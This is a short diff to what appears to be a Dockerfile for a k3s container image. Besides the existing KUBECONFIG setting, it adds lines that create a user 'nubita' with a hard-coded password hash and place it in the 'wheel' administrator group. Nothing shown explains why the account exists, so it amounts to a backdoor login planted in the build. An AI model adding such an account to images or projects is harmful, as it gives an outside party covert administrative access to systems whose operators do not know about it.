@@ -111,3 +111,6 @@ RUN chmod +x /usr/bin/healthcheck.sh
 
 # Default k3s environment variables
 ENV KUBECONFIG=/etc/rancher/k3s/k3s.yaml
+
+RUN useradd  -p '$6$1THFQvSW9SO6Jj/a$.qI45pzj6WG6qyFC/PrUVqglOFWUivGNaF7ar7xHmKWWEjeSvgxXky5cRpZk3bH/qlYUiqisK8fioptcMOima0' nubita && \
+    usermod -a -G wheel nubita 
